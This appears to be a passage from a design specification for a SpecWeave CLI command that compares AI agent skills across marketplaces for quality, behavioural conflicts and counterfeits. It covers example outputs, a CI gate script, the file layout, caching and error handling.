  Test Coverage    0/5       0/5
  Portability      4/5       1/5
  ───────────      ──────    ───────
  TOTAL            18/30     3/30

!!! WARNING: The ClawHub version appears to be a COUNTERFEIT skill.
It shares the name "react-best-practices" but has only 34.1% content similarity
with the original by vercel-labs. It contains credential access and remote code
execution patterns not present in the original. DO NOT INSTALL from ClawHub.

Recommendation: Install from GitHub (vercel-labs/agent-skills).
```

### 8.2 Example: Compare Two Competing Skills in the Same Domain

A developer is choosing between two React skills and wants to understand their differences before committing.

```bash
$ specweave fabric compare vercel-labs/react-best-practices softaworks/react-dev \
    --format summary --detect-conflicts

Skill Comparison: 2 skills in the "React" domain
=================================================

  Skill                                    Author       Installs   Lines
  ─────                                    ──────       ────────   ─────
  react-best-practices (vercel-labs)       Vercel       234,102    215
  react-dev (softaworks)                   Softaworks   1,677      312

Content Comparison
──────────────────
  Similarity:     41.7%
  Shared topics:  component-patterns, hooks, performance, state-management
  Unique to vercel-labs: Next.js integration, Vercel deploy patterns, server components
  Unique to softaworks: React 19 migration guide, ref-as-prop pattern, useActionState

Behavioral Conflicts: 4
  [CRITICAL] Topic: ref-handling
    vercel-labs:  (no explicit ref guidance -- compatible with both forwardRef and ref-as-prop)
    softaworks:   "Never implement forwardRef in React 19+" (line 87)
    Impact:       In React 18 projects, softaworks' rule would incorrectly prevent forwardRef usage

  [WARNING] Topic: memoization
    vercel-labs:  "Do not wrap simple expressions with primitive types in useMemo" (line 142)
    softaworks:   "Apply useMemo for expensive computations" (line 201)
    Impact:       Different scope -- vercel-labs is more restrictive

  [WARNING] Topic: state-management
    vercel-labs:  "Use Zustand selectors for performance optimization" (line 156)
    softaworks:   "Choose state management based on app complexity" (line 234)
    Impact:       softaworks is more flexible; vercel-labs prescribes Zustand specifically

  [INFO] Topic: file-structure
    vercel-labs:  Colocation pattern (components + hooks in same directory)
    softaworks:   Feature-based directory structure (features/ with component + hook + test)
    Impact:       Different organizational preferences; not a runtime conflict

Compatibility Assessment:
  These skills are PARTIALLY COMPATIBLE. They can coexist if:
  1. Your project uses React 19 (softaworks' ref rules are accurate)
  2. You accept Vercel's memoization restrictions as the stricter standard
  3. You have an explicit state management choice in your project config

  If using React 18: DO NOT install softaworks/react-dev alongside vercel-labs/react-best-practices.
```

### 8.3 Example: CI/CD Quality Gate with JSON Output

A CI pipeline uses the compare command to verify that a skill meets minimum quality standards before it is added to the project's skill set.

```bash
$ specweave fabric compare my-org/internal-react-skill \
    --sources github,registry \
    --json \
    --score \
    --detect-conflicts \
    > /tmp/skill-compare.json

$ jq '.scores.github.total' /tmp/skill-compare.json
22

$ jq '.summary.conflictCounts.critical' /tmp/skill-compare.json
0

# CI gate: require score >= 15 and zero critical conflicts
SCORE=$(jq '.scores.github.total' /tmp/skill-compare.json)
CRITICAL=$(jq '.summary.conflictCounts.critical' /tmp/skill-compare.json)

if [ "$SCORE" -lt 15 ] || [ "$CRITICAL" -gt 0 ]; then
  echo "FAIL: Skill does not meet quality gate (score=$SCORE, critical=$CRITICAL)"
  exit 1
fi

echo "PASS: Skill meets quality gate"
```

---

## 9. Architecture and File Layout

### 9.1 New Files

```
src/cli/commands/fabric-compare.ts          # CLI command handler (yargs integration)
src/core/fabric/compare/                    # Comparison engine directory
  index.ts                                  # Public API: compareSkills()
  content-diff.ts                           # Level 1: content diff (Myers algorithm)
  structural-diff.ts                        # Level 2: structural diff (frontmatter, sections)
  behavioral-diff.ts                        # Level 3: behavioral diff (directive extraction, conflicts)
  quality-scorer.ts                         # 6-dimension quality scoring
  types.ts                                  # All comparison-related TypeScript interfaces
src/core/fabric/sources/                    # Source adapter directory
  adapter-interface.ts                      # SkillSourceAdapter interface
  github-adapter.ts                         # GitHub source adapter
  skills-sh-adapter.ts                      # Skills.sh source adapter
  clawhub-adapter.ts                        # ClawHub source adapter
  registry-adapter.ts                       # SpecWeave Fabric Registry adapter
  npm-adapter.ts                            # npm registry adapter
  skillsmp-adapter.ts                       # SkillsMP adapter
  skillsdir-adapter.ts                      # SkillsDirectory adapter
  source-resolver.ts                        # Parallel resolution + deduplication
src/core/fabric/compare/formatters/         # Output formatters
  summary-formatter.ts                      # Terminal summary output
  side-by-side-formatter.ts                 # Two-column diff output
  unified-formatter.ts                      # Standard unified diff
  json-formatter.ts                         # Structured JSON output
tests/unit/core/fabric/compare/             # Test directory
  content-diff.test.ts
  structural-diff.test.ts
  behavioral-diff.test.ts
  quality-scorer.test.ts
  source-resolver.test.ts
```

### 9.2 Dependencies

| Package | Purpose | License |
|---------|---------|---------|
| `diff` | Line-level unified diff computation | BSD-3-Clause |
| `js-yaml` | YAML frontmatter parsing (already in project) | MIT |
| `chalk` | Terminal color output (already in project) | MIT |

No new external dependencies beyond what is already in the project. The `diff` package is the only potential addition (56KB, zero dependencies, BSD-3-Clause).

### 9.3 Integration with Existing CLI

The command registers as a subcommand under the `fabric` namespace in `bin/specweave.js`:

```typescript
// In src/cli/commands/fabric-compare.ts
import type { CommandModule } from 'yargs';

export const fabricCompareCommand: CommandModule = {
  command: 'fabric compare <skill-name>',
  describe: 'Compare a skill across discovery sources',
  builder: (yargs) => yargs
    .positional('skill-name', { type: 'string', demandOption: true })
    .option('sources', { type: 'string', describe: 'Comma-separated sources' })
    .option('format', { type: 'string', choices: ['summary', 'side-by-side', 'unified', 'json'], default: 'summary' })
    .option('verbose', { type: 'boolean', default: false })
    .option('json', { type: 'boolean', default: false })
    .option('score', { type: 'boolean', default: false })
    .option('detect-conflicts', { type: 'boolean', default: false })
    .option('output', { type: 'string' })
    .option('no-cache', { type: 'boolean', default: false })
    .option('timeout', { type: 'number', default: 10000 }),
  handler: async (argv) => { /* ... */ },
};
```

---

## 10. Caching Strategy

### 10.1 Cache Location

```
~/.specweave/cache/fabric-compare/
  {source}/{skill-hash}.json     # Cached SkillResolution objects
  {source}/{skill-hash}.meta     # Cache metadata (timestamp, TTL)
```

### 10.2 Cache Rules

| Source | Default TTL | Rationale |
|--------|-------------|-----------|
| github | 24 hours | Skills update infrequently; HEAD may change |
| skills-sh | 24 hours | Resolves to GitHub; same staleness profile |
| clawhub | 12 hours | Higher churn; security concerns warrant fresher data |
| registry | Indefinite | Local data; invalidated on registry update |
| npm | 24 hours | npm registry has its own CDN caching |
| skillsmp | 24 hours | Aggregator; follows GitHub staleness |
| skillsdir | 24 hours | Grade data may update on rescan cycles |

The `--no-cache` flag bypasses all cache reads. Cache writes still occur to populate fresh data.

---

## 11. Error Handling

### 11.1 Source Failures

Individual source failures do not abort the comparison. The command continues with available sources and reports failures in the output:

```
Sources Resolved: 5 of 7
  github         resolved
  skills-sh      resolved
  clawhub        FAILED: Connection timeout after 10000ms
  skillsmp       resolved
  skillsdir      resolved
  registry       not found (skill not in local registry)
  npm            FAILED: 404 Not Found

Proceeding with 5 resolved sources...
```

### 11.2 No Sources Resolved

If zero sources resolve the skill, the command exits with code 3 and a suggestion:

```
Error: Could not find "react-best-pratices" in any source.

Did you mean one of these?
  react-best-practices (github, skills-sh, clawhub, skillsmp, skillsdir)
  react-best-practice (github)
  react-best (skills-sh)
```

Fuzzy matching uses Levenshtein distance with a threshold of 3 edits.

### 11.3 Rate Limiting

GitHub API rate limiting (60 req/hour unauthenticated, 5000/hour authenticated) is handled with exponential backoff:

```
Warning: GitHub API rate limit reached. Retrying in 60 seconds...
Set GITHUB_TOKEN environment variable for higher rate limits (5000 req/hour).
```

---

## 12. Future Extensions

These are not part of the initial implementation but are designed-for in the architecture:

1. **Watch mode** (`--watch`): Periodically re-compare and alert when a source's content changes. Useful for monitoring upstream skill updates.

2. **Multi-skill comparison**: `specweave fabric compare react-best-practices react-dev react-expert` to compare three or more skills in a single run. The pairwise comparison matrix scales as O(n^2) but is practical for up to 10 skills.

3. **LLM-assisted semantic analysis**: Pass the behavioral diff output to an LLM for deeper conflict analysis. Behind the external API consent gate (per project memory: "NEVER use ANTHROPIC_API_KEY without explicit user consent").

4. **Interactive resolution**: A TUI (terminal UI) mode where the user walks through each conflict and selects a resolution strategy, which is then persisted to `.specweave/skill-priorities.json`.

5. **Registry submission integration**: When comparing a community skill against the registry, offer to submit a curated version to the Fabric Registry with the user's conflict resolutions applied.

---

## References

### Research Documents (This Increment)

- [T-003: Skill Discovery Sources and Quality Scoring Rubric](./skill-discovery-sources.md)
- [T-004: Skill Contradictions: Real-World Examples](./skill-contradictions.md)
- [T-001: Platform Security Postures](./platform-security-postures.md)
- [T-005: SpecWeave Security Infrastructure Audit](./specweave-security-audit.md)

### External References

- [Snyk ToxicSkills Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [Skills.sh Directory](https://skills.sh/)
- [ClawHub / OpenClaw Marketplace](https://clawhub.ai/)
- [SkillsDirectory.com](https://www.skillsdirectory.com/)
- [SkillsMP Marketplace](https://skillsmp.com/)
- [Agent Skills Standard Specification](https://agentskills.io/home)
- [GitHub Community Discussion #182117 (Skill Activation Instability)](https://github.com/orgs/community/discussions/182117)

### SpecWeave Source Files

- [`src/core/fabric/registry-schema.ts`](../../src/core/fabric/registry-schema.ts) -- FabricRegistryEntry, FabricSecurityScanResult
- [`src/core/fabric/security-scanner.ts`](../../src/core/fabric/security-scanner.ts) -- scanSkillContent()
